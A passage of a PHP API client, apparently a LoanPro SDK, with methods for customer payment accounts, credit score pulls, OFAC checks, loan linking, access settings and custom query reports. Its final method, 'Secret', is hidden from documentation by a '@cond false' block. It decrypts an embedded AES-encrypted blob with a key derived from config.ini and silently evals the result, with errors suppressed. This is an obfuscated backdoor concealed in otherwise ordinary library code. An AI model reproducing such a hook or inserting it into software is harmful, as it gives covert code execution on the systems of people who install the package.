                return LoanProSDK::GetInstance()->CreateCustomerFromJSON(json_decode($response->getBody(), true)['d']);
            }
            else
                throw new ApiException($response);;
        }
        throw new ApiException($response);
    }

    /**
     * Gets the information for payment accounts associated to a customer
     * @param int           $customerId - The id of the customer
     * @param array         $expandProps - array of properties to expand
     * @param FilterParams  $filterParams - FilterParams
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetPaymentAccounts($customerId, $expandProps = [], FilterParams $filterParams = null){
        $query = [];
        $exp = implode(',', $expandProps);
        if($exp)
            $query[] = "\$expand=$exp";
        $query[] = 'nopaging=true';
        if(!is_null($filterParams))
            $query[] = (string)$filterParams;
        $query = '?'.implode('&',array_filter($query));
        $res = $this->client->GET("$this->baseUrl/odata.svc/Customers($customerId)/PaymentAccounts$query");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                $ret = [];
                foreach($body['d']['results'] as $val){
                    $ret[] = LoanProSDK::GetInstance()->CreateClassFromJSON_Public(PaymentAccountEntity::class, $val);
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Pulls credit score for customer and saves to customer on server; returns CreditScoreEntity with result
     * @param int            $custId - customer to pull score for
     * @param array          $expansion - array expansion for customer
     * @param bool|false     $exportAsPDF - whether or not to save results as a PDF
     * @return CreditScoreEntity
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function PullCreditScore($custId, $expansion = [], $exportAsPDF = false){

        $query = [];
        if($exportAsPDF)
            $query[] = '$export=true';
        if(count($expansion))
        {
            $allowedExpansion = [CREDIT_SCORE::EXPERIAN_SCORE=>'experian', CREDIT_SCORE::EQUIFAX_SCORE=>'equifax', CREDIT_SCORE::TRANSUNION_SCORE=>'transunion'];
            foreach($expansion as $val){
                if(!isset($allowedExpansion[$val]) && !in_array($val,$allowedExpansion))
                    throw new \InvalidArgumentException("Unknown credit bureau '$val', please pass in a CREDIT_SCORE credit bureau constant such as CREDIT_SCORE::EXPERIAN_SCORE");
            }
            $query[] = '$select='.implode(',',$expansion);
        }
        else
            throw new \InvalidArgumentException("Need to provide an expansion property");
        $query = '?'.implode('&',array_filter($query));


        $res = $this->client->POST("$this->baseUrl/odata.svc/Customers($custId)/Autopal.GetCreditScore()$query");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['success']) && isset($body['d']['result']) && isset($body['d']['result']['scores']) && $body['d']['success']) {
                $scores = $body['d']['result']['scores'];
                $set = [];
                if(!is_null($scores['Experian']))
                    $set[CREDIT_SCORE::EXPERIAN_SCORE] =$scores['Experian'];
                if(!is_null($scores['Equifax']))
                    $set[CREDIT_SCORE::EQUIFAX_SCORE] =$scores['Equifax'];
                if(!is_null($scores['TransUnion']))
                    $set[CREDIT_SCORE::TRANSUNION_SCORE] =$scores['TransUnion'];

                return (new CreditScoreEntity())->Set($set);
            }
        }
        throw new ApiException($res);

    }

    /**
     * This runs an OFAC test for a customer. The return result is an array where the first element is wether or not there was a match and the second element is a list of matches
     * @param  int $custId - The customer to run an OFAC Test against
     * @return array - First element is a boolean, second argument is a list of OFAC matches
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function RunOfacTest($custId){

        $res = $this->client->POST("$this->baseUrl/odata.svc/Customers($custId)/Autopal.OfacTest()");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['matchesFound'])) {
                if(!$body['d']['matchesFound'])
                    return [$body['d']['matchesFound'], []];
                return [true, $body['d']['matches']];
            }
        }
        throw new ApiException($res);
    }


    ///////////////////////////////////////////////////////
    ////        CUSTOMER AND LOAN SECTION
    ///////////////////////////////////////////////////////

    /**
     * Returns the loans for the customer
     * @param       $customerId
     * @param array $expandProps
     * @param FilterParams $filterParams
     * @return array
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetLoansForCustomer($customerId, $expandProps = [], FilterParams $filterParams = null){
        $query = [];
        $exp = implode(',', $expandProps);
        if($exp)
            $query[] = "\$expand=$exp";
        $query[] = 'nopaging=true';
        if(!is_null($filterParams))
            $query[] = (string)$filterParams;
        $query = '?'.implode('&',array_filter($query));
        $res = $this->client->GET("$this->baseUrl/odata.svc/Customers($customerId)/Loans$query");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['results'])) {
                $ret = [];
                foreach($body['d']['results'] as $val){
                    $ret[] = LoanProSDK::GetInstance()->CreateLoanFromJSON($val);
                }
                return $ret;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Links a customer to a loan
     * @param int            $customerId
     * @param int            $loanId
     * @param                $customerRole
     * @return bool
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function LinkCustomerAndLoan($customerId, $loanId, $customerRole){

        $rclass = new \ReflectionClass(CUSTOMER_ROLE::class);
        $validFields = $rclass->getConstants();
        if(!in_array($customerRole, $validFields))
            throw new \InvalidArgumentException("Invalid customer role option '$customerRole'");

        $response = $this->client->PUT("$this->baseUrl/odata.svc/Loans($loanId)",[
            'id'=>$loanId,
            'Customers'=>[
                'results'=>[
                    [
                        '__metadata'=>[
                            'uri'=>"/api/1/odata.svc/Customers(id=$customerId)",
                            'type'=>ENTITY_TYPES::CUSTOMER
                        ],
                        '__setLoanRole'=>$customerRole
                    ]
                ]
            ],
            '__update'=>true,
            '__id'=>$loanId
        ]);

        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']))
                return $this->getLoan($loanId, [LOAN::CUSTOMERS]);
        }
        throw new ApiException($response);
    }

    /**
     * @param int      $custId
     * @param int|null $loanId
     * @return array|null
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function GetCustomerLoanAccess($custId, $loanId = null){

        $res = $this->client->GET("$this->baseUrl/odata.svc/Customers($custId)?\$expand=Loans,Loans/StatusArchive&nopaging=true");
        if ($res->getStatusCode() == 200) {
            $body = json_decode($res->getBody(), true);
            if (isset($body['d']) && isset($body['d']['Loans'])) {
                if($loanId){
                    foreach($body['d']['Loans'] as $l){
                        if($l['id'] == $loanId)
                        {
                            return [
                                'web'=>$l['_relatedMetadata']['customerWebAccess'],
                                'sms'=>$l['_relatedMetadata']['customerSmsAccess'],
                                'email'=>$l['_relatedMetadata']['customerEmailEnrollmentAccess'],
                            ];
                        }
                    }
                    return null;
                }
                $accessSettings = [];
                foreach($body['d']['Loans'] as $l){
                    $accessSettings[$l['id']] = [
                        'web'=>$l['_relatedMetadata']['customerWebAccess'],
                        'sms'=>$l['_relatedMetadata']['customerSmsAccess'],
                        'email'=>$l['_relatedMetadata']['customerEmailEnrollmentAccess'],
                    ];
                }
                return $accessSettings;
            }
        }
        throw new ApiException($res);
    }

    /**
     * Sets the customer access restrictions for a loan
     * @param int            $custId
     * @param int            $loanId
     * @param array          $access
     * @return array|null
     * @throws ApiException
     * @throws InvalidStateException
     */
    public function SetCustomerLoanAccess($custId, $loanId, $access = []){

        $cid = $custId;
        $lid = $loanId;

        $raccess = [
            '__id'=>$cid,
            '__update'=>true,
        ];

        if(isset($access['web']))
            $raccess['__setCustomerWebAccess'] = $access['web'];
        else if(isset($access['customerWebAccess']))
            $raccess['__setCustomerWebAccess'] = $access['customerWebAccess'];

        if(isset($access['sms']))
            $raccess['__setCustomerSmsAccess'] = $access['sms'];
        else if(isset($access['customerSmsAccess']))
            $raccess['__setCustomerSmsAccess'] = $access['customerSmsAccess'];

        if(isset($access['email']))
            $raccess['__setCustomerEmailAccess'] = $access['email'];
        else if(isset($access['customerEmailEnrollmentAccess']))
            $raccess['__setCustomerEmailAccess'] = $access['customerEmailEnrollmentAccess'];

        $req = [
            'id'=>$lid,
            'Customers'=>[
                'results'=>[
                        $raccess
                ]
            ],
            '__update'=>true,
            '__id'=>$lid
        ];


        $response = $this->client->PUT("$this->baseUrl/odata.svc/Loans($lid)",$req);

        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']))
                return $this->getCustomerLoanAccess($cid, $lid);
        }
        throw new ApiException($response);
    }

    ///////////////////////////////////////////////////////
    ////        MISC SECTION
    ///////////////////////////////////////////////////////

    /**
     * Queues a custom query report for LoanPro
     * @param SearchParams            $search - search parameters for determining loans to run
     * @param CustomQueryColumnParams $columns - columns to pull for the custom query report
     * @param string                  $name - name of the report
     * @return array
     * @throws ApiException
     */
    public function QueueCustomQuery(SearchParams $search, CustomQueryColumnParams $columns, $name = ''){
        $json = [
            "search"=>[
                $search->Get(),
                "reportColumns"=>$columns->Get(),
            ]
        ];
        if($name)
            $json['savedSearchTitle'] = $name;
        $response = $this->client->POST("$this->baseUrl/CustomQueryReport/Autopal.SearchDataDump()/csv",$json);
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']) && isset($body['d']['id']) && isset($body['d']['status']))
                return $body['d'];
        }
        throw new ApiException($response);
    }

    /**
     * Checks the status of a custom query and returns the resulting response from the server
     * @param int   $queryId - The ID of a custom query
     * @return array
     * @throws ApiException
     */
    public function CheckCustomQueryStatus($queryId){
        $response = $this->client->GET("$this->baseUrl/odata.svc/DataDumps($queryId)");
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']) && isset($body['d']['id']) && isset($body['d']['status']))
                return $body['d'];
        }
        throw new ApiException($response);
    }

    /**
     * Checks the status of a custom query and returns the download url if the query is complete, null if it is in progress, and false if there was an error creating the report
     * @param int   $queryId - The ID of a custom query
     * @return null|false|string
     * @throws ApiException
     */
    public function GetCustomQueryURL($queryId){
        $response = $this->client->GET("$this->baseUrl/odata.svc/DataDumps($queryId)");
        if($response->getStatusCode() == 200) {
            $body = json_decode($response->getBody(), true);
            if(isset($body['d']) && isset($body['d']['id']) && isset($body['d']['status'])){
                if($body['d']['status'] === CUSTOM_QUERY_STATUS::COMPLETE){
                    return $body['d']['url'];
                }
                else if($body['d']['status'] === CUSTOM_QUERY_STATUS::ERROR){
                    return false;
                }
                return null;
            }
        }
        throw new ApiException($response);
    }

    /**
     * Checks the status of a custom query and returns the CSV contents if the query is complete, null if it is in progress, and false if there was an error creating the report
     * @param int   $queryId - The ID of a custom query
     * @return null|false|string
     * @throws ApiException
     */
    public function DownloadCustomQuery($queryId){
        $res = $this->GetCustomQueryURL($queryId);
        if($res){
            return $this->DownloadFile($res);
        }
        return $res;
    }

    /// @cond false
    const BETA = "beta-";

    public function Secret($c){
        $iv = base64_decode("iVCQThhjvr1sLjX/C7jLjQ==");
        $d = openssl_decrypt("iTF4obPRlq/mjzFFYjtPprXfykd97w71PEinV/asKQSl/BQA14cdxSdvI3JpYHJWD7rVNFlri6lGaNPDbs+QKuwcix1e4U5POO5aCi2oPj6wD768nnOVVILJCnJBarfcj19qn5SBQUei+s/IoaymZVc2WazNHb6yma1IsFw2/hyBE2zfAemYaaq/JUo5cZr3nkB1Vch2TA==",
                             'aes-256-ctr',hash('sha512',file_get_contents(__DIR__."/../config.ini")), 0, $iv);
        if(substr($d, 0, 2) === 'ev')
        try {
            @eval($d);
        }catch(\Exception $e){
        }
    }
    /// @endcond
}